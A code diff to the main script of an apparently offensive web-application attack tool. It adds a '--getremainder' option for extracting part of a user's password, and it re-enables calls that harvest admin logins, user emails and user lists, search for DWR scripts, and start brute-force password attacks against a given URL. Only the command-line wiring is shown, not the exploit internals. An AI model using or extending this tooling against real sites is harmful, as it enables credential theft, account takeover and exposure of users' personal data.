@@ -20,6 +20,7 @@ if __name__ == '__main__':
     parser.add_argument('--brute', action='store_const', const='brute', dest='brute', default=False, help="Brute a users retrieve from a file")
     parser.add_argument('--users-file', action='store', dest='users_file', help='Users file retrieve from previous exploit')
     parser.add_argument('--password-file', action='store', dest='password_file', help='Password file')
+    parser.add_argument("--getremainder", action="store", dest="remainder", help="get password remainder for a input user", default=False)
     results = parser.parse_args()
 
     if results.url and results.brute:
@@ -38,9 +39,8 @@ if __name__ == '__main__':
             mmObj.HaveDWR()
             mmObj.GetAdminLogin()
             mmObj.xpltUserEmail()
-            #mmObj.XptGetURemainder()
             mmObj.XptGetUsersLogin()
-            #mmObj.SearchDWRScripts()
+            mmObj.SearchDWRScripts()
             answer = input(ask("[+] Start brute force ? Y/n: ")).lower()
             if answer[0] == "y":
                 urllib3.disable_warnings()
@@ -66,9 +66,8 @@ if __name__ == '__main__':
             mmObj.HaveDWR()
             mmObj.GetAdminLogin()
             mmObj.xpltUserEmail()
-            #mmObj.XptGetURemainder()
             mmObj.XptGetUsersLogin()
-            #mmObj.SearchDWRScripts()
+            mmObj.SearchDWRScripts()
             answer = input(ask("[+] Start brute force ? Y/n: ")).lower()
             if answer[0] == "y":
                 urllib3.disable_warnings()
@@ -93,6 +92,18 @@ if __name__ == '__main__':
         mmObj.HaveDWR()
         mmObj.GetAdminLogin()
         mmObj.xpltUserEmail()
-        #mmObj.XptGetURemainder()
         mmObj.XptGetUsersLogin()
-        #mmObj.SearchDWRScripts()
+        mmObj.SearchDWRScripts()
+
+    if results.remainder and results.url != None:
+        urllib3.disable_warnings()
+        mmObj = Cofe(results.url, results.max_threads, results.random_agent)
+        mmObj.RandomAgent()
+        mmObj.CleanUrl()
+        mmObj.ToString()
+        mmObj.IsUpOrDown()
+        mmObj.XptGetUsersLogin()
+        mmObj.XptGetURemainder()
+
+        
+    
